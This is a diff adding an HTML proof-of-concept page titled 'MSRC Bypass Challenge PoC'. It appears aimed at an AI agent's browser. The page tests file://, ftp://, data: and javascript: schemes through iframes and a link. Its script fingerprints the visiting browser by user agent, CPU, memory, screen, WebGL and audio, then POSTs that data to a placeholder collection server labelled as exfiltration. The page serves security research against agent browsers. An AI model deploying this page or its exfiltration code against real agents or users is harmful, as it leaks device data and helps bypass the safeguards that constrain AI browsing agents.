@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MSRC Bypass Challenge PoC</title>
+</head>
+<body>
+  <h2>MSRC Agent Browser Bypass Demo</h2>
+  <pre id="out"></pre>
+
+  <h3>Protocol Tests</h3>
+  <!-- file:// -->
+  <iframe src="file:///C:/WindowsSystem32/calc.exe"></iframe>
+  <!-- ftp:// -->
+  <iframe src="ftp://127.0.0.1/"></iframe>
+  <!-- data:// -->
+  <iframe src="data:text/html,<h1>DATA URL Test</h1>"></iframe>
+  <!-- javascript:// -->
+  <a href="javascript:alert('JS scheme triggered')">JS Scheme Test</a>
+
+  <script>
+    const out = document.getElementById("out");
+    function log(msg){ out.textContent += msg + "\n"; }
+
+    log("=== Fingerprinting Info ===");
+
+    // User agent & platform
+    log("User Agent: " + navigator.userAgent);
+    log("Platform: " + navigator.platform);
+
+    // CPU & RAM
+    log("CPU cores: " + navigator.hardwareConcurrency);
+    log("Device memory: " + navigator.deviceMemory + " GB");
+
+    // Screen info
+    log("Screen: " + screen.width + "x" + screen.height);
+
+    // WebGL renderer
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl");
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      if (debugInfo) {
+        log("WebGL Renderer: " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+      } else {
+        log("WebGL renderer info not available");
+      }
+    } catch(e) { log("WebGL blocked: " + e); }
+
+    // Audio fingerprint
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      log("AudioContext sampleRate: " + ctx.sampleRate);
+    } catch(e) { log("Audio blocked: " + e); }
+
+    // Data exfiltration bypass (example: send to your server)
+    fetch("https://your-server.com/collect", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        ua: navigator.userAgent,
+        cores: navigator.hardwareConcurrency,
+        ram: navigator.deviceMemory,
+        screen: screen.width + "x" + screen.height
+      })
+    }).then(r => log("Exfiltration request sent (status: " + r.status + ")"))
+      .catch(e => log("Exfiltration failed: " + e));
+  </script>
+</body>
+</html>
